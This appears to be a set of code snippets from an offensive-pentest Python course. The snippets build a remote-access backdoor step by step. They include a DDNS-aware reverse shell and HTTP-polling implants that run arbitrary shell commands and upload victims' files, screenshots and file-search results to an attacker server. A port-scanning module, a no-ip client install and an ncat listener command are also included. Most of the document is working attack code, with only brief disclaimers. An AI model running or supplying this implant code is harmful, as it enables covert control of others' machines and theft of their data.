["```\ncd /usr/local/src/\n```", "```\nwget http://www.no-ip.com/client/linux/noip-duc-linux.tar.gz\n```", "```\ntar xf noip-duc-linux.tar.gz\n```", "```\ncd noip-2.1.9-1/\n```", "```\nmake install\n```", "```\n'''\nCaution\n--------\nUsing this script for any malicious purpose is prohibited and against the law. Please read no-ip.com terms and conditions carefully. \nUse it on your own risk. \n'''\n\n# Python For Offensive PenTest\n\n# DDNS Aware Shell\n\nimport socket \nimport subprocess \nimport os\n\n...\n\ndef connect(ip):\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((ip, 8080)) # instead of hardcoding the ip addr statically we pass our ip variable \n\n...\n\ndef main ():\n    ip = socket.gethostbyname('pythonhussam.ddns.net') # We will use the os to send out a dns query for pythonhussam.ddns.net\n    print \"Resolved IP was: \" + ip # Please don't forget to change this name to yours :D\n    connect(ip) # we will pass the ip variable which contains the attacker ip to connect function \nmain()\n```", "```\n>>>\nAttacker IP is: 37.202.101.240\n>>>\n```", "```\n<meta name=\"description\" content=\"The latest Tweets from Hussam Khrais (@HussamKhrais): &quot;Hello from kali python&quot;\">\n```", "```\n'''\nCaution\n--------\nUsing this script for any malicious purpose is prohibited and against the law. Please read Twitter terms and conditions carefully. \nUse it on your own risk. \n'''\n\n# Python For Offensive PenTest\n\n# Tweets Grabber\n\nfrom BeautifulSoup import BeautifulSoup as soupy\nimport urllib\nimport re\n\nhtml = urllib.urlopen('https://twitter.com/HussamKhrais').read()\nsoup = soupy(html)\n#Navigate to my twitter home page HussamKhrais, store the HTML page into html variable and pass it\n#to soupy function so we can parse it\n\nx = soup.find(\"meta\", {\"name\":\"description\"})['content']\nprint x\n#Here we search for specific HTML meta tags, please see the video to know how did i find these parameters :) \n\nfilter = re.findall(r'\"(.*?)\"',x) # After parsing the html page, our tweet is located between double quotations\ntweet = filter[0] # using regular expression we filter out the tweet \nprint tweet\n\n```", "```\n# Python For Offensive PenTest\n\n# Screen Capturing\n\nimport requests \nimport subprocess \nimport os\nimport time\n\nfrom PIL import ImageGrab # Used to Grab a screenshot\n\nwhile True: \n\n    req = requests.get('http://10.0.2.15')\n    command = req.text\n\n    if 'terminate' in command:\n        break\n\n    elif 'grab' in command:\n        grab,path=command.split('*')\n        if os.path.exists(path):\n            url = 'http://10.0.2.15/store'\n            files = {'file': open(path, 'rb')}\n            r = requests.post(url, files=files)\n        else:\n            post_response = requests.post(url='http://10.0.2.15', data='[-] Not able to find the file !' )\n\n    elif 'screencap' in command: #If we got a screencap keyword, then .. \n        ImageGrab.grab().save(\"img.jpg\", \"JPEG\")\n        url = 'http://10.0.2.15/store' \n        files = {'file': open(\"img.jpg\", 'rb')}\n        r = requests.post(url, files=files) #Transfer the file over our HTTP\n\n    else:\n        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n        post_response = requests.post(url='http://10.0.2.15', data=CMD.stdout.read() )\n        post_response = requests.post(url='http://10.0.2.15', data=CMD.stderr.read() )\n\n    time.sleep(3)\n```", "```\n# Python For Offensive PenTest\n\n# Screen Capturing\n\nimport requests \nimport subprocess \nimport os\nimport time\n\nfrom PIL import ImageGrab # Used to Grab a screenshot\nimport tempfile # Used to Create a temp directory\nimport shutil # Used to Remove the temp directory\n\nwhile True: \n\n    req = requests.get('http://10.0.2.15')\n    command = req.text\n\n    if 'terminate' in command:\n        break\n\n    elif 'grab' in command:\n        grab,path=command.split('*')\n        if os.path.exists(path):\n            url = 'http://10.0.2.15/store'\n            files = {'file': open(path, 'rb')}\n            r = requests.post(url, files=files)\n        else:\n            post_response = requests.post(url='http://10.0.2.15', data='[-] Not able to find the file !' )\n\n    elif 'screencap' in command: #If we got a screencap keyword, then ...\n\n        dirpath = tempfile.mkdtemp() #Create a temp dir to store our screenshot file\n\n        ImageGrab.grab().save(dirpath + \"\\img.jpg\", \"JPEG\") #Save the screencap in the temp dir\n\n        url = 'http://10.0.2.15/store' \n        files = {'file': open(dirpath + \"\\img.jpg\", 'rb')}\n        r = requests.post(url, files=files) #Transfer the file over our HTTP\n\n        files['file'].close() #Once the file gets transferred, close the file.\n        shutil.rmtree(dirpath) #Remove the entire temp dir\n\n...\n```", "```\n# Python For Offensive PenTest\n\n# Searching for Content\n\nimport requests \nimport subprocess \nimport os\nimport time\n\nwhile True: \n\n    req = requests.get('http://10.0.2.15')\n    command = req.text\n\n    if 'terminate' in command:\n        break \n\n    elif 'grab' in command:\n        grab,path=command.split('*')\n        if os.path.exists(path):\n            url = 'http://10.0.2.15/store'\n            files = {'file': open(path, 'rb')}\n            r = requests.post(url, files=files)\n        else:\n            post_response = requests.post(url='http://10.0.2.15', data='[-] Not able to find the file !' )\n\n    elif 'search' in command: # The Formula is search <path>*.<file extension> , for example let's say that we got search C:\\\\*.pdf\n        # if we remove the first 7 character the output would C:\\\\*.pdf which is basically what we need\n\n        command = command[7:] # cut off the the first 7 character ,, output would be C:\\\\*.pdf\n\n        path,ext=command.split('*') # split C:\\\\*.pdf into two sections, the first section (C:\\\\) will be stored in path variable and\n                                     # the second variable (.pdf) will be stored in ext variable\n\n        list = '' # here we define a string where we will append our result on it\n        '''\n           os.walk is a function that will navigate ALL the directories specified in the provided path and returns three values:-\n\n            dirpath is a string contains the path to the directory\n            dirnames is a list of the names of the subdirectories in dirpath\n            files is a list of the files name in dirpath\n\n            Once we got the files list, we check each file (using for loop), if the file extension was matching what we are looking for, then\n            we add the directory path into list string. the os.path.join represents a path relative for our file to\n            the current directory and in our example it's the C:\\\\ directory\n\n        '''\n\n        for dirpath, dirname, files in os.walk(path):\n            for file in files:\n                if file.endswith(ext):\n                    list = list + '\\n' + os.path.join(dirpath, file)\n\n        requests.post(url='http://10.0.2.15', data= list ) # Send the search result\n...       \n```", "```\nsearch C:\\*.pdf \n```", "```\ngrab*C:\\Users\\hkrais\\Documents\\Module 3.pdf\n```", "```\nsearch C:\\*.txt\n```", "```\nsearch C:\\Users\\hkrais\\Desktop\\.txt\n```", "```\n# Python For Offensive PenTest\n\n# Directory Navigation\n\nimport socket \nimport subprocess \nimport os\n\ndef transfer(s,path):\n    if os.path.exists(path):\n        f = open(path, 'rb')\n        packet = f.read(1024)\n        while packet != '':\n            s.send(packet) \n            packet = f.read(1024)\n        s.send('DONE')\n        f.close()\n\n    else: \n        s.send('Unable to find out the file')\n\ndef connect():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('10.0.2.15', 8080)) \n\n    while True: \n        command = s.recv(1024)\n\n        if 'terminate' in command:\n            s.close()\n            break \n\n        elif 'grab' in command: \n            grab,path = command.split('*')\n            try:\n                transfer(s,path)\n            except Exception,e:\n                s.send ( str(e) )\n                pass\n\n        elif 'cd' in command: # the forumula here is gonna be cd then space then the path that we want to go to, like cd C:\\Users\n            code,directory = command.split (' ') # split up the received command based on space into two variables\n            os.chdir(directory) # changing the directory \n            s.send( \"[+] CWD Is \" + os.getcwd() ) # we send back a string mentioning the new CWD\n...\n```", "```\n>>>\nShell> cd C:\\Users\n[+] CWD Is C:\\Users\n>>>\n```", "```\ngrab*Module 3.pdf \n```", "```\n# Python For Offensive PenTest\n\n#Low Level Port Scanner\n\nimport socket # For Building TCP Connection\nimport subprocess # To start the shell in the system\nimport os\n\ndef transfer(s,path):\n    if os.path.exists(path):\n        f = open(path, 'rb')\n        packet = f.read(1024)\n        while packet != '':\n            s.send(packet) \n            packet = f.read(1024)\n        s.send('DONE')\n        f.close()\n\n    else: # the file doesn't exist\n        s.send('Unable to find out the file')\n...\n```", "```\n...\ndef scanner(s,ip,ports):\n\n    scan_result = '' # scan_result is a variable stores our scanning result\n\n    for port in ports.split(','): # remember the ports are separated by a comma in this format 21,22,..\n\n        try: # we will try to make a connection using socket library for EACH one of these ports\n\n            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n            output = sock.connect_ex((ip, int(port) )) #connect_ex This function returns 0 if the operation succeeded, and in our case operation succeeded means that \n        #the connection happens which means the port is open otherwise the port could be closed or the host is unreachable in the first place.\n\n            if output == 0:\n                scan_result = scan_result + \"[+] Port \" +port+ \" is opened\" +'\\n'\n\n            else:\n                scan_result = scan_result + \"[-] Port \" +port+\" is closed or Host is not reachable\" +'\\n'\n\n            sock.close()\n\n        except Exception, e:\n            pass\n    s.send (scan_result) # finally we send the result back to our kali\n...\n```", "```\n...\ndef connect():\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(('10.0.2.15', 8080))\n\n    while True: # keep receiving commands from the Kali machine\n        command = s.recv(1024)\n\n        if 'terminate' in command:\n            s.close()\n            break # close the socket\n\n        elif 'grab' in command: # grab*C:\\Users\\Hussam\\Desktop\\photo.jpeg\n            grab,path = command.split('*')\n            try:\n                transfer(s,path)\n            except Exception,e:\n                s.send ( str(e) )\n                pass\n\n        elif 'scan' in command: # syntax: scan 10.0.2.15:22,80\n            command = command[5:] # cut off the leading first 5 char \n            ip,ports = command.split(':') # split the output into two sections where the first variable is the ip which we want to scan and the second variable is the list of ports\n                                          # that we want to check its status\n            scanner(s,ip,ports)\n\n...\n```", "```\nscan 10.0.2.15:21,23,80,443,445,137,138,8080 \n```", "```\n>>>\n[-] Port 21 is closed or Host is not reachable\n[-] Port 23 is closed or Host is not reachable\n[-] Port 80 is closed or Host is not reachable\n[-] Port 443 is closed or Host is not reachable\n[-] Port 445 is closed or Host is not reachable\n[-] Port 137 is closed or Host is not reachable\n[-] Port 139 is closed or Host is not reachable\n[+] Port 8080 is opened\n>>>\n```", "```\nnetstat -antp | grep \"8080\"\n```", "```\nncat -lvp 21\n```"]